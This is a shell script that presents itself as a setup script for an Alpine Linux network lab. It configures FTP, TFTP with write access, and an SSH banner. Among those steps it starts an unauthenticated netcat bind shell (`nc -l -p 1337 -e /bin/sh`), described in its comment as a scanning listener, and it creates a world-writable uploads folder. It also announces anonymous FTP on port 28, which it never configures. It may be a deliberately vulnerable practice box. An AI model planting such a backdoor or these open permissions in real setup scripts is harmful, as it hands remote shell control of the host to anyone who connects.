#!/bin/sh
# Network Laboratory Configuration Script
# Alpine Linux Minimal Setup

echo "Setting up Alpine Network Lab Environment..."

# Configure FTP service on non-standard port
rc-update add vsftpd default
rc-service vsftpd start

# Setup TFTP service
rc-update add tftp-hpa default
echo 'TFTP_USERNAME="tftp"' > /etc/conf.d/tftp-hpa
echo 'TFTP_DIRECTORY="/shared/network-lab/tftp"' >> /etc/conf.d/tftp-hpa
echo 'TFTP_ADDRESS="0.0.0.0:69"' >> /etc/conf.d/tftp-hpa
echo 'TFTP_OPTIONS="--secure --create"' >> /etc/conf.d/tftp-hpa
rc-service tftp-hpa start

# Configure NetCat listener for advanced scanning
nohup nc -l -p 1337 -e /bin/sh &

# Setup SSH with custom banner
echo 'Banner /etc/ssh/lab-banner' >> /etc/ssh/sshd_config
echo 'Alpine-Minimal-v3.18-NetworkLab' > /etc/ssh/lab-banner
rc-service sshd restart

# Create shared lab resources
mkdir -p /shared/network-lab/{docs,scripts,tftp,uploads}
chmod 755 /shared/network-lab
chmod 777 /shared/network-lab/uploads
chown -R labuser:labuser /shared/network-lab

echo "Lab environment configured successfully!"
echo "FTP: Port 28 (anonymous enabled)"
echo "SSH: Port 22 (banner: Alpine-Minimal-v3.18-NetworkLab)"
echo "TFTP: Port 69 (read/write enabled)"
echo "NetCat: Port 1337 (shell access)"